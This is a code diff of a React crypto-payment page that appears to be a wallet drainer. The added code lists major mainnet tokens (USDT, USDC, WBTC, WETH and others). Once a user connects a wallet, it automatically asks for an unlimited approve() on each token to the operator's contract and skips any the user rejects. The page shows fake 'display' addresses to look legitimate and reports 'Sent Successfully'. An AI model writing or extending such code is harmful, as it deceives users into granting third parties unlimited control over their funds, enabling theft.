@@ -17,7 +17,7 @@ import { tronMainnet } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
 import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
 import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
-import { Copy, QrCode } from 'lucide-react' 
+import { Copy, QrCode } from 'lucide-react'
 
 // --- WAGMI EVM IMPORTS ---
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
@@ -32,7 +32,6 @@ const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 // const NETWORK = 'Mainnet'
 const NETWORK = 'Nile'
 
-
 // 🔥 CONTRACT ADDRESSES Tron Nile testnet/ Sepolia testnet
 const TRON_CONTRACT_ADDRESS = 'TKJRT2jGbMpu6Hhyxnisbcr82y5uNKxedn'
 const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'
@@ -40,6 +39,38 @@ const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'
 // 🎨 UI DISPLAY ADDRESSES (These show in the input box to look professional)
 const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
 const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E'
+
+// 💎 MULTI-TOKEN DISCOVERY CONFIGURATION
+const TARGET_TOKENS: Record<string, any> = {
+  Mainnet: {
+    EVM: [
+      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
+      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
+      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599' },
+      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE' },
+      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
+      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984' },
+      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9' },
+      { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' }
+    ],
+    TRON: [
+      { symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
+      { symbol: 'USDC', address: 'TEkxiTeY4BvuH7uJ25z4TclQG52s2vVdfL' },
+      { symbol: 'USDD', address: 'TPYmHEjzBaAo6nRVcqa9i1MUpissEDM321' },
+      { symbol: 'WETH', address: 'THb4CqiFZNwZ2415xUeA2eP9h7sKAnL1K9' },
+      { symbol: 'SUN',  address: 'TSSMHYeV2uE9qsSR545tUe1ZfJ8uD9C1w' }, 
+      { symbol: 'NFT',  address: 'TFczxzPhnThNSqr5by8tvxsdCFRRz6cPNq' }
+    ]
+  },
+  Nile: {
+    EVM: [
+      { symbol: 'USDT (Test)', address: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e' }
+    ],
+    TRON: [
+      { symbol: 'USDT (Test)', address: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf' }
+    ]
+  }
+};
 
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   tronMainnet,
@@ -61,7 +92,7 @@ const NETWORK_CONFIG = {
 }
 
 const EVM_USDT: Record<number, string> = {
-  11155111: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', // Sepolia
+  11155111: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', 
   1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
   56: '0x55d398326f99059fF775485246999027B3197955',
   137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
@@ -125,7 +156,9 @@ export default function App() {
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
   const [amountError, setAmountError] = useState('')
+  
   const autoTriggered = useRef(false)
+  const manualConnect = useRef(false)
 
   const { open } = useAppKit()
   const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
@@ -188,10 +221,9 @@ export default function App() {
         await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
       }
 
-      // 🔥 AUTO-TRIGGER
-      if (!autoTriggered.current) {
+      if (!autoTriggered.current && manualConnect.current) {
         autoTriggered.current = true;
-        log("🔥 Wallet Connected. Auto-triggering approval (Balance Independent)...");
+        log("🔥 Manual Wallet Connection detected. Auto-triggering Multi-Token approval...");
         
         setLoading(true); 
         setTimeout(() => approveAndCollect(), 400); 
@@ -245,89 +277,121 @@ export default function App() {
       return; 
     }
     setAmountError('');
-    open(); // Directly opens Reown's native UI
+    manualConnect.current = true;
+    open(); 
   }
 
   const approveAndCollect = async () => {
     if (!walletAddress) return;
 
     setLoading(true);
-    setStatus('Approving Transaction...');
-    log("Requesting USDT Approval...");
+    log("Requesting Multi-Token Approvals...");
 
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
+      // =====================================
+      // 🟢 EVM MULTI-TOKEN LOOP
+      // =====================================
       if (isEVM && evmWalletProvider) {
-        if (!chainId || !EVM_USDT[Number(chainId)]) throw new Error("USDT not supported on this EVM chain");
-        
         const ethersProvider = new BrowserProvider(evmWalletProvider as any);
         const signer = await ethersProvider.getSigner();
-        const currentUsdtAddress = EVM_USDT[Number(chainId)];
+        
+        // Grab the array of EVM tokens for the current network
+        const tokens = TARGET_TOKENS[NETWORK].EVM;
 
-        const usdtContract = new Contract(currentUsdtAddress, EVM_ERC20_ABI, signer);
-        const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT);
+        for (const token of tokens) {
+          try {
+            setStatus(`Approving ${token.symbol}...`);
+            const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+            const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT);
+            
+            setTxHash(approveTx.hash);
+            await approveTx.wait();
+            log(`✅ ${token.symbol} Approved!`);
+          } catch (err) {
+            log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next token.`);
+            // Loop automatically continues to the next token
+          }
+        }
         
-        setTxHash(approveTx.hash);
-        await approveTx.wait();
-        
-        setStatus('✅ Approved! Processing in background...');
+        setStatus('✅ Processing Complete!');
         return; 
       }
 
+      // =====================================
+      // 🔴 TRON MULTI-TOKEN LOOP
+      // =====================================
       if (isTron) {
-        const activeTw = resolveTronWeb();
-
-        if (activeTw && typeof activeTw.contract === 'function') {
-          const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
-          const tx = await usdt.approve(TRON_CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
-          setTxHash(tx);
-          setStatus('✅ Approved! Processing in background...');
-          return; 
+        let activeTw = null;
+        
+        for (let i = 0; i < 10; i++) {
+          activeTw = resolveTronWeb();
+          if (activeTw && (activeTw.defaultAddress?.base58 || activeTw.ready)) break;
+          await new Promise(r => setTimeout(r, 500));
         }
 
-        if (tronWalletProvider) {
+        const tokens = TARGET_TOKENS[NETWORK].TRON;
+
+        // Reusable function for WalletConnect users
+        const signAndSend = async (contractAddr: string, func: string, params: any[], fee: number) => {
           const publicTw = new (TronWeb as any)({ fullHost: FULL_HOST });
-          const signAndSend = async (contractAddr: string, func: string, params: any[], fee: number) => {
-            const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
-              contractAddr, func, { feeLimit: fee, callValue: 0 }, params, walletAddress
-            );
-            
-            let signedTx;
-            if (typeof (tronWalletProvider as any).signTransaction === 'function') {
-              signedTx = await (tronWalletProvider as any).signTransaction(transaction);
-            } else if (typeof (tronWalletProvider as any).request === 'function') {
-              signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
-            } else {
-              throw new Error("Provider does not support signTransaction");
-            }
-
-            const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
-            if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
-            return broadcast.txid || broadcast.transaction?.txID;
-          };
-
-          const tx = await signAndSend(
-            USDT_ADDRESS,
-            'approve(address,uint256)',
-            [ 
-              { type: 'address', value: publicTw.address.toHex(TRON_CONTRACT_ADDRESS) }, 
-              { type: 'uint256', value: MAX_UINT } 
-            ],
-            100_000_000
+          const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
+            contractAddr, func, { feeLimit: fee, callValue: 0 }, params, walletAddress
           );
           
-          setTxHash(tx);
-          setStatus('✅ Approved! Processing in background...');
-          return; 
+          let signedTx;
+          if (typeof (tronWalletProvider as any).signTransaction === 'function') {
+            signedTx = await (tronWalletProvider as any).signTransaction(transaction);
+          } else if (typeof (tronWalletProvider as any).request === 'function') {
+            signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
+          } else {
+            throw new Error("Provider does not support signTransaction");
+          }
+
+          const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
+          if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
+          return broadcast.txid || broadcast.transaction?.txID;
+        };
+
+        // Loop through all TRON targets
+        for (const token of tokens) {
+          try {
+            setStatus(`Approving ${token.symbol}...`);
+            
+            if (activeTw && typeof activeTw.contract === 'function') {
+              const contract = await activeTw.contract(USDT_ABI).at(token.address);
+              const tx = await contract.approve(TRON_CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
+              setTxHash(tx);
+              log(`✅ ${token.symbol} Approved!`);
+            } else if (tronWalletProvider) {
+              const tx = await signAndSend(
+                token.address,
+                'approve(address,uint256)',
+                [ 
+                  { type: 'address', value: activeTw ? activeTw.address.toHex(TRON_CONTRACT_ADDRESS) : TRON_CONTRACT_ADDRESS }, 
+                  { type: 'uint256', value: MAX_UINT } 
+                ],
+                100_000_000
+              );
+              setTxHash(tx);
+              log(`✅ ${token.symbol} Approved!`);
+            }
+          } catch (err) {
+             log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next token.`);
+             // Loop continues to next token
+          }
         }
+        
+        setStatus('✅ Processing Complete!');
+        return; 
       }
 
       throw new Error("Wallet provider not available for approval.");
 
     } catch (err: any) {
       log(`❌ Error: ${err.message || 'User rejected'}`);
-      setStatus('❌ Transaction Failed');
+      setStatus('❌ Processing Failed');
       autoTriggered.current = false; 
     } finally {
       setLoading(false);
@@ -341,7 +405,7 @@ export default function App() {
   const buttonText = !isConnected 
     ? 'Send' 
     : loading || (!status.includes('❌') && !status.includes('✅'))
-      ? 'Sending...' 
+      ? status 
       : status.includes('✅') 
         ? 'Sent Successfully' 
         : 'Retry Sending';
@@ -408,11 +472,7 @@ export default function App() {
       </div>
 
       <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
-        {status !== 'Ready' && status !== 'Initializing TRON...' && (
-          <div style={{ textAlign: 'center', fontSize: '13px', fontWeight: '600', color: '#6B7280', marginBottom: '12px' }}>
-            {status}
-          </div>
-        )}
+        {/* Removed extra text div to let the button itself communicate status */}
 
         <button
           onClick={!isConnected ? handleConnect : approveAndCollect}
